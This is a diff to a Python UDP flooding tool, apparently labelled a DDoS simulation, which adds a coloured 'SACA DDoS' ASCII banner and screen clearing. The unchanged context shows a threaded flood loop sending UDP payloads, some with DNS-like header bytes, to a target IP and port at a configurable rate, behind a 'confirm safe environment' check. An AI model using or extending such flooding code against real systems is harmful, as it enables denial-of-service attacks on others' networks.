@@ -5,6 +5,43 @@ import threading
 import random
 import sys
 import signal
+import os
+from colorama import init, Fore, Back, Style
+
+# Initialiseer colorama
+init(autoreset=True)
+
+# ──────────────────────────────────────────────────────────────────────────────
+# ASCII BANNER
+# ──────────────────────────────────────────────────────────────────────────────
+BANNER = r"""
+>>===================================================================<<
+||                                                                   ||
+||   _____         _____                 _____  _____        _____   ||
+||  / ____|  /\   / ____|   /\          |  __ \|  __ \      / ____|  ||
+|| | (___   /  \ | |       /  \         | |  | | |  | | ___| (___    ||
+||  \___ \ / /\ \| |      / /\ \        | |  | | |  | |/ _ \\___ \   ||
+||  ____) / ____ \ |____ / ____ \       | |__| | |__| | (_) |___) |  ||
+|| |_____/_/    \_\_____/_/    \_\      |_____/|_____/ \___/_____/   ||
+||                                                                   ||
+>>===================================================================<<
+"""
+
+def clear_screen():
+    """Clear the terminal screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def display_banner():
+    """Print de banner gecentreerd en in kleur."""
+    try:
+        width = os.get_terminal_size().columns
+    except OSError:
+        width = 80  # fallback
+    
+    for line in BANNER.splitlines():
+        print(Style.BRIGHT + Fore.RED + Back.BLACK + line.center(width) + Style.RESET_ALL)
+    print(Style.BRIGHT + Back.BLACK + " " * width + Style.RESET_ALL)
+    print(Style.RESET_ALL)
 
 # ──────────────────────────────────────────────────────────────────────────────
 # CONFIGURATIE
@@ -53,8 +90,6 @@ def flood():
                 payload = b'\x00\x00\x01\x00\x00\x01' + payload
             try:
                 sock.sendto(payload, (TARGET_IP, TARGET_PORT))
-                # Debug: toon verzending
-                # print(f"Verzonden {len(payload)} bytes naar {TARGET_IP}:{TARGET_PORT}")
                 if RATE_PPS > 0:
                     time.sleep(1 / RATE_PPS)
             except Exception as e:
@@ -65,6 +100,8 @@ def flood():
         sock.close()
 
 def main():
+    clear_screen()
+    display_banner()
     bevestig_veilige_omgeving()
     print(f"\n[!] START DDoS SIMULATIE")
     print(f"Target: {TARGET_IP}:{TARGET_PORT}")
